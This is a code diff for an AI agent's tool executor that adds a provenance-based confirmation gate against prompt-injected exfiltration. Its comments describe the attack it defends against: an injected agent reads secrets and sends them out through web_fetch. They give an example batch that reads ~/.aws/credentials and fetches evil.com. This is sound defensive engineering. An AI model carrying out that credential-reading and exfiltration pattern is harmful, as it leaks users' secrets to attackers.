@@ -6,6 +6,7 @@ import type { SkillRegistry } from "../skills/registry.js";
 import type { ContextManager } from "./context.js";
 import type { ObservabilityHandler } from "./observability.js";
 import type { SnapshotManager } from "../state/snapshot.js";
+import { escapesCwdSync, isCredentialPath } from "../tools/file/paths.js";
 
 // Output truncation is controlled by Tool.truncateOutput.
 // read is excluded — it supports offset/limit pagination and agents rely on
@@ -33,6 +34,11 @@ export interface ExecutorDeps {
   obs?: ObservabilityHandler;
   snapshot?: SnapshotManager;
   cwd?: string;
+  /** #309 provenance bump: true when the current turn (since the last user
+   *  message) has consumed untrusted content. While set, outbound/mutating
+   *  tools (bash/write/edit/multi_edit/web_fetch/mcp__*) are forced through the
+   *  confirmation gate. Supplied by the agent loop each turn. */
+  untrustedConsumed?: boolean;
 }
 
 export function truncateOutput(output: string, callId: string, tmpDir?: string): string {
@@ -68,6 +74,45 @@ export interface ExecutionResult {
   skillResults: FunctionResultPart[];
 }
 
+/**
+ * Tools whose results deliver untrusted content: anything fetched from the
+ * network, any external MCP server, and reads of paths outside the project root
+ * (which include credential locations — see src/tools/file/paths.ts). Project-
+ * local reads are the user's own files and stay trusted (#309).
+ */
+export function isUntrustedSource(toolName: string, args: Record<string, unknown>): boolean {
+  if (toolName === "web_fetch" || toolName.startsWith("mcp__")) return true;
+  if (toolName === "read" || toolName === "grep") {
+    // Missing/invalid path args default to cwd — trusted project-local.
+    const raw = toolName === "grep" ? args.path : args.file_path;
+    if (typeof raw !== "string") return false;
+    return escapesCwdSync(raw) || isCredentialPath(raw);
+  }
+  return false;
+}
+
+/**
+ * The provenance-tracking confirmation bump (#309): while the current turn has
+ * consumed untrusted content (out-of-project reads, web_fetch, MCP results), any
+ * outbound or mutating tool is forced through the HITL gate even if its own
+ * predicate would not require it. This is the structural defense that closes the
+ * exfiltration channel a prompt-injected agent otherwise has: read a secret (from
+ * a legitimately-readable project file), then web_fetch it to a PUBLIC attacker
+ * host — which the SSRF guard permits by design. See
+ * docs/design/prompt-injection-defenses.md.
+ */
+export function bumpRequired(toolName: string, untrustedConsumed: boolean): boolean {
+  if (!untrustedConsumed) return false;
+  return (
+    toolName === "web_fetch" ||
+    toolName === "bash" ||
+    toolName === "write" ||
+    toolName === "edit" ||
+    toolName === "multi_edit" ||
+    toolName.startsWith("mcp__")
+  );
+}
+
 async function executeOneCall(
   call: FunctionCallPart,
   deps: ExecutorDeps,
@@ -87,13 +132,13 @@ async function executeOneCall(
       ...sig,
     };
   }
+  const args = call.args as Record<string, unknown>;
   const needsConfirm =
-    tool?.requiresConfirmation?.(call.args as Record<string, unknown>) ||
-    deps.forcesConfirmation?.(call.name, call.args as Record<string, unknown>);
+    tool?.requiresConfirmation?.(args) ||
+    deps.forcesConfirmation?.(call.name, args) ||
+    bumpRequired(call.name, deps.untrustedConsumed === true);
   if (needsConfirm) {
-    const decision = deps.confirmFn
-      ? await deps.confirmFn(call.name, call.args as Record<string, unknown>)
-      : "deny";
+    const decision = deps.confirmFn ? await deps.confirmFn(call.name, args) : "deny";
     if (decision === "deny") {
       deps.obs?.({
         type: "tool_denied",
@@ -138,6 +183,10 @@ async function executeOneCall(
     name: call.name,
     result: output,
     ...sig,
+    // Provenance tag (#309): marks this result as having delivered untrusted
+    // content, which the agent loop reads to keep the confirmation bump armed
+    // for the rest of the turn.
+    ...(isUntrustedSource(call.name, args) ? { untrusted: true } : {}),
   };
 }
 
@@ -174,6 +223,26 @@ export async function executeCalls(
   // prevent race conditions (e.g. two edits to the same file, or a write
   // followed by a read that depends on it). Pure read batches still run in
   // parallel for speed.
+  //
+  // #309: before dispatching, arm the provenance bump for the whole batch when
+  // any call in it READS untrusted content — i.e. a read/grep of a path outside
+  // the project or a credential file. This closes the same-batch race: a
+  // parallel readonly batch like [read ~/.aws/credentials, web_fetch evil.com]
+  // evaluates web_fetch's confirmation before the read's result exists, but the
+  // intent is visible from the args. web_fetch and MCP calls are deliberately
+  // NOT arming here — their content is only consumed after the batch returns,
+  // and a turn's FIRST outbound fetch must stay prompt-free (the bump gates
+  // what follows consumption, not the initial request).
+  const batchArms = toolCalls.some((c) => {
+    if (c.name !== "read" && c.name !== "grep") return false;
+    const raw = c.name === "grep" ? c.args.path : c.args.file_path;
+    return typeof raw === "string" && (escapesCwdSync(raw) || isCredentialPath(raw));
+  });
+  const batchDeps: ExecutorDeps = {
+    ...deps,
+    untrustedConsumed: deps.untrustedConsumed || batchArms,
+  };
+
   let results: FunctionResultPart[];
   if (toolCalls.some((c) => !deps.tools.get(c.name)?.readonly)) {
     // Snapshot before any writes — capture is idempotent on clean trees and
@@ -182,10 +251,10 @@ export async function executeCalls(
 
     results = [];
     for (const call of toolCalls) {
-      results.push(await executeOneCall(call, deps));
+      results.push(await executeOneCall(call, batchDeps));
     }
   } else {
-    results = await Promise.all(toolCalls.map((call) => executeOneCall(call, deps)));
+    results = await Promise.all(toolCalls.map((call) => executeOneCall(call, batchDeps)));
   }
 
   return { results, skillResults };
